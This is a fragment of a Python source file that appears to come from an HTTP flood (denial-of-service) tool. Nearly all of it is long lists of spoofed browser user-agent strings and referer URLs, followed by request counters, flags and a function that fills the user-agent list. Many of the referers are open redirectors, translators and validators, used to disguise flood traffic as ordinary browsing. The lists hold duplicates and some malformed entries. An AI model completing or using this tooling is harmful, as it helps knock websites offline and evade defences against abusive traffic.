        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Q312469)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 2.0.50727)",
        "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Maxthon; SV1; FDM)",
        "Mozilla/5.0 (Macintosh; U; PPC; de-DE; rv:1.0.2)",
        "Mozilla/5.0 (Windows; U; Win98; de-DE; rv:1.7.12)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.0.1)",
        "Mozilla/5.0 (compatible; Konqueror/3.4; Linux 2.6.14-kanotix-9; X11)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.10)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.12)",
        "Mozilla/5.0 (Windows; U; Win98; de; rv:1.8.0.1)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.0.1)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; de; rv:1.8.0.1)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.2)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.0.1)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.7)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.6)",
        "Mozilla/5.0 (X11; U; Linux i686; de; rv:1.8)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.8)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.10)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.7.10)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; pl; rv:1.8.0.1)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-us)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; de; rv:1.8.0.1)",
        "Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.7.12)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.8)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; fi; rv:1.8.0.1)",
        "Mozilla/5.0 (X11; U; Linux i686; de-AT; rv:1.4.1)",
        "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.8.0.1)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr-FR; rv:1.7.12)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; zh-TW; rv:1.8.0.1)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.7.3)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.7.12)",
        "Mozilla/5.0 (X11; U; Linux i686; fr; rv:1.7.12)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; sl; rv:1.8.0.1)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.0.1)", 
        "Mozilla/5.0 (X11; Linux i686; rv:1.7.5)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; de-DE; rv:1.7.6)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.2)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; es-ES; rv:1.6)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.0.1)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.7.6)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8a3)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-DE; rv:1.7.10)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; de-AT; rv:1.7.12)",
        "Mozilla/5.0 (Windows; U; Win 9x 4.90; en-US; rv:1.7.5)",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-BR; rv:1.8.0.1)",
        "Mozilla/5.0 (compatible; Konqueror/3; Linux)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8)",
        "Mozilla/5.0 (compatible; Konqueror/3.2; Linux)",
        "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; tg)",
        "Mozilla/5.0 (X11; U; Linux i686; de-DE; rv:1.8b4)"
        "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 YaBrowser/13.10.1500.9323 Safari/537.36",
        "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30",
"Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9",
"Mozilla/5.0 (Linux; U; Android 2.3.5; zh-cn; HTC_IncredibleS_S710e Build/GRJ90) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari,"
"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile,"
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1",
"Mozilla/5.0 (Linux; U; Android 2.3.3; de-ch; HTC Desire Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
"Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1,"
          'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3)'
            'Gecko/20090913 Firefox/3.5.3',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)'
            'Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1)'
            'Gecko/20090718 Firefox/3.5.1',
            'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US)'
            'AppleWebKit/532.1 (KHTML, like Gecko)'
            'Chrome/4.0.219.6 Safari/532.1',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64;'
            'Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0;'
            'Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322;'
            '.NET CLR 3.5.30729; .NET CLR 3.0.30729)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2;'
            'Win64; x64; Trident/4.0)',
            'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0;'
            'SV1; .NET CLR 2.0.50727; InfoPath.2)',
            'Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)',
            'Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)',
            'Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51'
            ]
headers_referers=["https://w...content-available-to-author-only...m.vn/?gws_rd=ssl#q=",
        "http://y...content-available-to-author-only...x.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..",
        "http://content-available-to-author-only.com/profile.php?redirect=",
        "http://w...content-available-to-author-only...y.com/search/results?q=",
        "http://y...content-available-to-author-only...x.ru/yandsearch?text=",
        "http://g...content-available-to-author-only...l.ru/search?mail.ru=1&q=",
        "http://n...content-available-to-author-only...r.ru/search?=btnG?=%D0?2?%D0?2?%=D0..",
        "http://r...content-available-to-author-only...a.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..",
        "http://r...content-available-to-author-only...o.com/search;_yzt=?=A7x9Q.bs67zf..",
        "http://r...content-available-to-author-only...o.com/search;?_query?=l%t=?=?A7x..",
        "http://g...content-available-to-author-only...l.ru/search?gay.ru.query=1&q=?abc.r..",
        "http://n...content-available-to-author-only...r.ru/search?btnG=%D0%9D%?D0%B0%D0%B..",
        "http://w...content-available-to-author-only...e.ru/url?sa=t&rct=?j&q=&e..",
        "http://h...content-available-to-author-only...u.com/searchResult?keywords=",
        "http://w...content-available-to-author-only...g.com/search?q=",
        "https://w...content-available-to-author-only...x.com/yandsearch?text=",
        "https://d...content-available-to-author-only...o.com/?q=",
        "http://w...content-available-to-author-only...k.com/web?q=",
        "http://s...content-available-to-author-only...l.com/aol/search?q=",
        "https://w...content-available-to-author-only...m.nl/vaste-onderdelen/zoeken/?zoeken_term=",
        "http://v...content-available-to-author-only...3.org/feed/check.cgi?url=",
        "http://h...content-available-to-author-only...r.com/check_page/?furl=",
        "http://w...content-available-to-author-only...r.com/url/translation.aspx?direction=er&sourceURL=",
        "http://j...content-available-to-author-only...3.org/css-validator/validator?uri=",
        "https://a...content-available-to-author-only...o.com/rss?url=",
        "http://e...content-available-to-author-only...l.com/search?q=",
        "https://s...content-available-to-author-only...y.com/market/search?q=",
        "http://f...content-available-to-author-only...o.com/search?q=",
        "http://w...content-available-to-author-only...t.com/site/pinterest.com/search?q=",
        "http://e...content-available-to-author-only...e.net/wow/en/search?q=",
        "http://e...content-available-to-author-only...l.com/search?q=",
        "http://c...content-available-to-author-only...n.org/search?q=",
        "http://t...content-available-to-author-only...t.edu/search?q=",
        "http://w...content-available-to-author-only...m.tv/search?q=",
        "http://w...content-available-to-author-only...d.com/search?q=",
        "http://f...content-available-to-author-only...a.com/search?q=",
        "http://i...content-available-to-author-only...h.io/search?q=",
        "http://j...content-available-to-author-only...s.com/jobs/search?q=",
        "http://t...content-available-to-author-only...p.org/search?q=",
        "http://w...content-available-to-author-only...m.vn/news/vn/search&q=",
        "https://play.google.com/store/search?q=",
        "http://w...content-available-to-author-only...s.gov/@@tceq-search?q=",
        "http://w...content-available-to-author-only...t.com/search?q=",
        "http://w...content-available-to-author-only...r.com/events/search?q=",
        "https://c...content-available-to-author-only...e.org/search?q=",
        "http://j...content-available-to-author-only...s.com/search?q=",
        "http://j...content-available-to-author-only...g.com/search?q=",
        "https://w...content-available-to-author-only...t.com/search/?q=",
        "http://m...content-available-to-author-only...r.org/search?q=",
        "https://w...content-available-to-author-only...s.com/search?q=",
        "http://w...content-available-to-author-only...s.uk/search?q=",
        "http://w...content-available-to-author-only...q.com/search?q="
        "http://www.google.com/?q=",
        "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%..",
        "http://vk.com/profile.php?redirect=",
        "http://www.usatoday.com/search/results?q=",
        "http://engadget.search.aol.com/search?q=query?=query=..",
        "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882",
        "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925",
        "http://yandex.ru/yandsearch?text=",
        "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832",
        "http://go.mail.ru/search?mail.ru=1&q=",
        "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0..",
        "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%..",
        "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf..",
        "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x..",
        "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r..",
        "/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882",
        "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B..",
        "http://www.google.ru/url?sa=t&rct=?j&q=&e..",
        "http://help.baidu.com/searchResult?keywords=",
#bing
    "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=",
         "http://www.google.com/?q=",
         "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
         "https://l.facebook.com/l.php?u=https://l.facebook.com/l.php?u=",
         "https://drive.google.com/viewerng/viewer?url=",
         "http://www.google.com/translate?u=",
         "https://developers.google.com/speed/pagespeed/insights/?url=",
         "http://help.baidu.com/searchResult?keywords=",
         "http://www.bing.com/search?q=",
         "https://add.my.yahoo.com/rss?url=",
         "https://play.google.com/store/search?q=",
         "https://www.google.com.vn/?gws_rd=ssl#q=",
         "http://yandex.ru/yandsearch?text=",
         "http://vk.com/profile.php?redirect=",
         "http://www.usatoday.com/search/results?q=",
         "http://go.mail.ru/search?mail.ru=1&q=",
         "http://www.ask.com/web?q=",
         "http://search.aol.com/aol/search?q=",
         "http://validator.w3.org/feed/check.cgi?url=",
         "http://host-tracker.com/check_page/?furl=",
         "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
         "http://jigsaw.w3.org/css-validator/validator?uri=",
         "http://engadget.search.aol.com/search?q=",
         "https://steamcommunity.com/market/search?q=",
         "http://filehippo.com/search?q=",
         "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
         "http://eu.battle.net/wow/en/search?q=",
         "http://engadget.search.aol.com/search?q=",
         "http://careers.gatesfoundation.org/search?q=",
         "http://techtv.mit.edu/search?q=",
         "http://www.ustream.tv/search?q=",
         "http://www.ted.com/search?q=",
         "http://funnymama.com/search?q=",
         "http://itch.io/search?q=",
         "http://jobs.rbs.com/jobs/search?q=",
         "http://taginfo.openstreetmap.org/search?q=",
         "http://www.baoxaydung.com.vn/news/vn/search&q=",
         "http://www.tceq.texas.gov/@@tceq-search?q=",
         "http://www.reddit.com/search?q=",
         "http://www.bestbuytheater.com/events/search?q=",
         "https://careers.carolinashealthcare.org/search?q=",
         "http://jobs.leidos.com/search?q=",
         "http://jobs.bloomberg.com/search?q=",
         "https://www.pinterest.com/search/?q=",
         "http://millercenter.org/search?q=",
         "https://www.npmjs.com/search?q=",
         "http://www.evidence.nhs.uk/search?q=",
         "http://regex.info/exif.cgi?dummy=on&imgurl=",
         "http://translate.google.com/translate?u=",
         "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
         "http://validator.w3.org/check?uri=",
         "http://jigsaw.w3.org/css-validator/validator?uri=",
         "http://validator.w3.org/checklink?uri=",
         "http://www.w3.org/RDF/Validator/ARPServlet?URI=",
         "http://validator.w3.org/mobile/check?docAddr=",
         "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
         "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
         "http://feedvalidator.org/check.cgi?url=",
         "http://gmodules.com/ig/creator?url=",
         "http://www.google.com/ig/adde?moduleurl=",
         "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
         "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
         "http://host-tracker.com/check_page/?furl=",
         "http://streamitwebseries.twww.tv/proxy.php?url=",
     "https://www.yandex.com/yandsearch?text=",
     "https://duckduckgo.com/?q=",
     "http://www.ask.com/web?q=",
     "http://search.aol.com/aol/search?q=",
     "https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=",
     "https://www.facebook.com/search/results/?init=quick&q=",
     "http://blekko.com/#ws/?q=",
     "http://www.infomine.com/search/?q=",
     "https://twitter.com/search?q=",
     "http://www.wolframalpha.com/input/?i=",
         "http://host-tracker.com/check_page/?furl=",
     "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
         "http://nova.rambler.ru/search?query=",
         "https://ru.wikipedia.org/w/index.php?search=",
         "https://search.yahoo.com/search?p=",
         "http://go.mail.ru/search?q=",
         "https://www.google.ru/?gws_rd=ssl#newwindow=1&q=",
         "https://www.yandex.com/yandsearch?text=",
         "http://www.ask.com/web?q=",
         "http://search.aol.com/aol/search?q=",
         "http://validator.w3.org/feed/check.cgi?url=",
         "http://host-tracker.com/check_page/?furl=",
         "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
         "http://jigsaw.w3.org/css-validator/validator?uri=",
         "http://engadget.search.aol.com/search?q=",
         "https://steamcommunity.com/market/search?q=",
         "http://filehippo.com/search?q=",
         "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
         "http://eu.battle.net/wow/en/search?q=",
         "http://engadget.search.aol.com/search?q=",
         "http://careers.gatesfoundation.org/search?q=",
         "http://techtv.mit.edu/search?q=",
         "http://www.ustream.tv/search?q=",
         "http://www.ted.com/search?q=",
         "http://funnymama.com/search?q=",
         "http://itch.io/search?q=",
         "http://jobs.rbs.com/jobs/search?q=",
         "http://taginfo.openstreetmap.org/search?q=",
         "http://www.baoxaydung.com.vn/news/vn/search&q=",
         "http://www.tceq.texas.gov/@@tceq-search?q=",
         "http://www.reddit.com/search?q=",
         "http://www.bestbuytheater.com/events/search?q=",
         "https://careers.carolinashealthcare.org/search?q=",
         "http://jobs.leidos.com/search?q=",
         "http://jobs.bloomberg.com/search?q=",
         "https://www.pinterest.com/search/?q=",
         "http://millercenter.org/search?q=",
         "https://www.npmjs.com/search?q=",
         "http://www.evidence.nhs.uk/search?q=",
         "https://www.shodan.io/search?query=",
         "https://www.google.fr/?gws_rd=ssl#q=",
         "https://www.facebook.com/search/results/?init=quick&q=",
         "https://www.google.com.ph/#q=",
         "http://vi.wiktionary.org/w/index.php?search=",
         "http://en.wiktionary.org/w/index.php?search=",
     "https://bigfuture.collegeboard.org/sitesearch?q=",
     "http://dictionary.reference.com/browse/as?s=",
     "https://www.yandex.com/yandsearch?text=",
     "https://www.facebook.com/search/results/?init=quick&q=",
     "http://blekko.com/#ws/?q=",
     "http://www.infomine.com/search/?q=",
     "https://twitter.com/search?q=",
     "http://www.wolframalpha.com/input/?i=",
     "http://host-tracker.com/check_page/?furl=",
     "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://engadget.search.aol.com/search?q=",
     "https://steamcommunity.com/market/search?q=",
     "http://filehippo.com/search?q=",
     "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
     "http://eu.battle.net/wow/en/search?q=",
     "http://engadget.search.aol.com/search?q=",
     "http://careers.gatesfoundation.org/search?q=",
     "http://techtv.mit.edu/search?q=",
     "http://www.ustream.tv/search?q=",
     "http://www.ted.com/search?q=",
     "http://funnymama.com/search?q=",
     "http://itch.io/search?q=",
     "http://jobs.rbs.com/jobs/search?q=",
     "http://taginfo.openstreetmap.org/search?q=",
     "http://www.tceq.texas.gov/@@tceq-search?q=",
     "http://www.reddit.com/search?q=",
     "http://www.bestbuytheater.com/events/search?q=",
     "https://careers.carolinashealthcare.org/search?q=",
     "http://jobs.leidos.com/search?q=",
     "http://jobs.bloomberg.com/search?q=",
     "https://www.pinterest.com/search/?q=",
     "http://millercenter.org/search?q=",
     "https://www.npmjs.com/search?q=",
     "http://www.evidence.nhs.uk/search?q=",
     "http://www.shodanhq.com/search?q=",
     "http://ytmnd.com/search?q=",
     "http://engadget.search.aol.com/search?q=",
     "https://steamcommunity.com/market/search?q=",
     "http://filehippo.com/search?q=",
     "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
     "http://eu.battle.net/wow/en/search?q=",
     "http://engadget.search.aol.com/search?q=",
     "http://careers.gatesfoundation.org/search?q=",
     "http://techtv.mit.edu/search?q=",
     "http://www.ustream.tv/search?q=",
     "http://www.ted.com/search?q=",
     "http://funnymama.com/search?q=",
     "http://itch.io/search?q=",
     "http://jobs.rbs.com/jobs/search?q=",
     "http://taginfo.openstreetmap.org/search?q=",
     "http://www.baoxaydung.com.vn/news/vn/search&q=",
     "http://www.tceq.texas.gov/@@tceq-search?q=",
     "http://www.reddit.com/search?q=",
     "http://www.bestbuytheater.com/events/search?q=",
     "https://careers.carolinashealthcare.org/search?q=",
     "http://jobs.leidos.com/search?q=",
     "http://jobs.bloomberg.com/search?q=",
     "https://www.pinterest.com/search/?q=",
     "http://millercenter.org/search?q=",
     "https://www.npmjs.com/search?q=",
     "http://www.evidence.nhs.uk/search?q=",
     "http://www.shodanhq.com/search?q=",
     "http://ytmnd.com/search?q=",
     "http://engadget.search.aol.com/search?q=",
     "https://steamcommunity.com/market/search?q=",
     "http://filehippo.com/search?q=",
     "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
     "http://eu.battle.net/wow/en/search?q=",
     "http://engadget.search.aol.com/search?q=",
     "http://careers.gatesfoundation.org/search?q=",
     "http://techtv.mit.edu/search?q=",
     "http://www.ustream.tv/search?q=",
     "http://www.ted.com/search?q=",
     "http://funnymama.com/search?q=",
     "http://itch.io/search?q=",
     "http://jobs.rbs.com/jobs/search?q=",
     "http://taginfo.openstreetmap.org/search?q=",
     "http://www.baoxaydung.com.vn/news/vn/search&q=",
     "http://www.tceq.texas.gov/@@tceq-search?q=",
     "http://www.reddit.com/search?q=",
     "http://www.bestbuytheater.com/events/search?q=",
     "https://careers.carolinashealthcare.org/search?q=",
     "http://jobs.leidos.com/search?q=",
     "http://jobs.bloomberg.com/search?q=",
     "https://www.pinterest.com/search/?q=",
     "http://millercenter.org/search?q=",
     "https://www.npmjs.com/search?q=",
     "http://www.evidence.nhs.uk/search?q=",
     "http://www.shodanhq.com/search?q=",
     "http://ytmnd.com/search?q=",
     "http://engadget.search.aol.com/search?q=",
     "https://steamcommunity.com/market/search?q=",
     "http://filehippo.com/search?q=",
     "http://www.topsiteminecraft.com/site/pinterest.com/search?q=",
     "http://eu.battle.net/wow/en/search?q=",
     "http://engadget.search.aol.com/search?q=",
     "http://careers.gatesfoundation.org/search?q=",
     "http://techtv.mit.edu/search?q=",
     "http://www.ustream.tv/search?q=",
     "http://funnymama.com/search?q=",
     "http://itch.io/search?q=",
     "http://jobs.rbs.com/jobs/search?q=",
     "http://taginfo.openstreetmap.org/search?q=",
     "http://www.baoxaydung.com.vn/news/vn/search&q=",
     "http://www.tceq.texas.gov/@@tceq-search?q=",
     "http://www.reddit.com/search?q=",
     "http://www.bestbuytheater.com/events/search?q=",
     "https://careers.carolinashealthcare.org/search?q=",
     "http://jobs.leidos.com/search?q=",
     "http://jobs.bloomberg.com/search?q=",
     "https://www.pinterest.com/search/?q=",
     "http://millercenter.org/search?q=",
     "https://www.npmjs.com/search?q=",
     "http://www.evidence.nhs.uk/search?q=",
     "http://www.shodanhq.com/search?q=",
     "http://ytmnd.com/search?q=",
         "http://www.lynda.com/search?q=",
     "https://www.flickr.com/search/?q=",
     "http://steamcommunity.com/market/search?q=",
     "https://qrobe.it/search/?q=",
     "https://soundcloud.com/search?q=",
     "https://twitter.com/search?q=",
     "https://www.freesound.org/search/?q=",
     "https://www.apple.com/search/?q=",
     "https://www.google.co.in/#q=",
     "https://www.google.com.au/#q=",
     "http://www.bbc.co.uk/iplayer/search?q=",
     "https://www.google.co.nz/#q=",
     "https://luarocks.org/search?q=mjolnir?q=",
     "http://journals.aps.org/search?q=",
     "https://www.google.ru/webhp?hl=ru&newwindow=1&ei=YCJrVdTMNs6LuwT3kIC4Cg#newwindow=1&hl=ru&q=",
     "http://search.iminent.com/es-ES/search/#q="
    "http://client.paltalk.com/client/webapp/client/External.wmt?url=", 
    "https://www.google.com.ph/#q=",]
request_counter=0
flag=0
safe=0

def inc_counter():
  global request_counter
  request_counter+=1

def set_flag(val):
  global flag
  flag=val

def set_safe():
  global safe
  safe=1
  
# generates a user agent array
def useragent_list():
  global headers_useragents
  headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
  headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
  headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
  headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
  headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
  headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
  headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
  headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
  headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
